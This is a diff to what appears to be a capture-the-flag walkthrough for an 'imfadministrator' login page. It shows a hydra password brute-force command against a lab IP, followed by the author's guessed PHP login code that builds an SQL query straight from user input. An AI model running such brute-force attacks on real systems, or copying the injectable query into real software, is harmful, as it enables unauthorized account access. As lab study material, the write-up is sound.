@@ -164,5 +164,33 @@ gunzip ./rockyou.txt.gz
 
 hydra -l rmichaels -P /usr/share/wordlists/rockyou.txt 172.16.1.76 http-form-post "/imfadministrator/index.php:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=71jtqremlb5q74hge3apaog8d3" -t 64
 ```
-# .. To be continued ..
+24 hours later - I was probably wrong about having to brute force this form.
+
+Perhaps a somthing easier? The hint that the developer gives is:
+
+```html
+<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
+```
+
+So the login code might be somthing like this:
+
+```php
+// Still building this out
+<?php
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$password = "hardCodedPassword";
+$query = "select * from users where user='$user'";
+$result = mysql_query($query);
+$rows = mysql_fetch_array($result);
+if($rows) {
+	echo "You have Logged in successfully" ;
+	create_session();
+}
+else {
+	echo "Better Luck Next time";
+}
+```
+
+
 
